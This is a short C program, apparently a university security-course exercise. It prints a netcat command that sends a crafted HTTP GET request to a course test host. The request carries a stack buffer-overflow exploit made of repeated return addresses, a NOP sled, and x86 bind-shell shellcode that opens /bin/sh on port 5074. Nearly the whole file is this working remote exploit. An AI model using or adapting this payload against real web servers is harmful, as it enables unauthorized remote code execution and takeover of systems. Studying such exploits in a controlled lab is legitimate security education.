#include <string.h>
#include <stdlib.h>
#include <stdio.h>

int main(int argc, char *argv[]) {
	printf("echo -e \"GET /");
	//return address
	for (int i = 0; i < 50; i++){
		printf("\\x84\\xfe\\xff\\xbf");
	}
	//NOPs  
	for (int i = 0; i < 550; i++){
		printf("\\x90");
	}
	//Shellcode; Port 5074
	printf("\\x31\\xc0\\x50\\x40\\x89\\xc3\\x50\\x40\\x50\\x89\\xe1\\xb0\\x66\\xcd\\x80\\x31\\xd2\\x52\\x66\\x68\\x13\\xd2\\x43\\x66\\x53\\x89\\xe1\\x6a\\x10\\x51\\x50\\x89\\xe1\\xb0\\x66\\xcd\\x80\\x40\\x89\\x44\\x24\\x04\\x43\\x43\\xb0\\x66\\xcd\\x80\\x83\\xc4\\x0c\\x52\\x52\\x43\\xb0\\x66\\xcd\\x80\\x93\\x89\\xd1\\xb0\\x3f\\xcd\\x80\\x41\\x80\\xf9\\x03\\x75\\xf6\\x52\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x52\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80 HTTP\" | nc 310test.cs.duke.edu 9104");
}